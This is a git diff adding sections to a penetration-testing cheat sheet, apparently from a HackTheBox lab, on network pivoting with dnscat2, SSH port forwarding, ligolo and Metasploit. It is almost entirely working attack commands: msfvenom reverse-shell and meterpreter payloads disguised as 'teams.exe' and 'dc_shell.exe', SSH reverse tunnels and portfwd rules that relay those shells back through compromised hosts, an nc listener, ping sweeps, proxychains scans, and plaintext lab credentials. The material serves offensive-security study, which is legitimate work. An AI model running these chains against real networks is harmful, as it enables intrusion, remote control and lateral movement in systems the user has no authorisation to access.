@@ -14,6 +14,32 @@ Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecre
 dnscat2> ? # help option
 dnscat2> window -i 1 # drop a shell
 ```
+
+## SSH 
+```bash
+# ssh dynamic port forwarding
+
+ssh -D 8081 -i id_rsa <USER>@<TARGET_MACHINE>
+
+# confirm port frw
+netstat -antp | grep 8081  # 127.0.0.1:8081   0.0.0.0:*      LISTEN
+
+# Next, we need to modify the /etc/proxychains.conf to use the port we specified with our dynamic port forwarding command (8081 here).
+cat /etc/proxychains.conf # socks4 	127.0.0.1 8081
+proxychains nmap -sT -p 21,22,80,8080 <TARGET_MACHINE>
+
+--------------------------------------------------------------------------
+# ssh remote/reverse port forwarding (spwn reverse shell or transfer files)
+ssh -i id_rsa -R <Internal_TARGET_MACHINE(172.16.8.120)>:443:0.0.0.0:4444 root@<TARGET_MACHINE> -vN
+
+msfvenom -p windows/x64/shell_reverse_https lhost=172.16.8.120 -f exe -o teams.exe LPORT=443
+nc -lnvp 7000
+-------------------------------------------------------------------------
+# To achieve this, we can use another SSH port forwarding command, this type Local Port Forwarding. The command allows us to pass all RDP traffic to DEV01 through the dmz01 host via local port 13389.
+ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111
+xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino!
+```
+
 ## SOCKS5 Tunneling with Chisel
 ```bash
 # Chisel can create a client-server tunnel connection in a firewall restricted environment.
@@ -207,7 +233,8 @@ https://freedium.cfd/https://medium.com/@issam.qsous/mastering-multi-pivot-strat
 #7.Ping the New Subnet:  
 `ping 192.168.8.129` 
 
-#8.Ping Sweep to Discover Hosts:  
+#8.Ping Sweep to Discover Hosts:  (must run on the compromised host)
+# ligolo maybe not handel the ping so dont use ping or nmap -sn on ligolo
 for i in {1..254} ;do (ping -c 1 192.168.8.$i | grep "from" &) ;done 
 
 #9.Execute Reverse Shell from Ligolo-2 to Kali:
@@ -377,3 +404,40 @@ sudo ip route del 172.16.4.0/23 dev ligolo
 sudo ip link set ligolo down
 sudo ip link delete ligolo
 ```
+> #8.Ping Sweep to Discover Hosts:  (must run on the compromised host) ligolo maybe not handel the ping so dont use ping or nmap -sn on ligolo
+for i in {1..254} ;do (ping -c 1 192.168.8.$i | grep "from" &) ;done 
+
+
+---
+
+  ## Metasploit 
+  
+  ```bash
+ # local port fwrd for revser shell :  Attack host --> dmz01 --> DC01 --> MGMT01
+(Meterpreter 1)(/tmp) > getuid  # dmz01 : root 
+# Next, set up a local port forwarding rule to forward all traffic destined to port 1234 on dmz01 to port 8443 on our attack host.
+(Meterpreter 1)(/root) > portfwd add -R -l 8443 -p 1234 -L 10.10.14.15
+# Next, create an executable payload that we'll upload to the Domain Controller host.
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 -f exe -o dc_shell.exe LPORT=1234
+bg
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 8443
+exploit  
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> .\dc_shell.exe
+
+# Dynamic port forwarding 
+(Meterpreter 2)(C:\) > run autoroute -s 172.16.9.0/23
+(Meterpreter 2)(C:\) > background
+route print
+  #    172.16.9.0         255.255.254.0      Session 2
+use auxiliary/server/socks_proxy 
+auxiliary(server/socks_proxy) >> show options 
+set srvport 9050
+set version 4a
+run
+cat /etc/proxychains.conf # socks4 	127.0.0.1 9050  
+proxychains nmap -sT -p 22 172.16.9.25
+``` 
+  
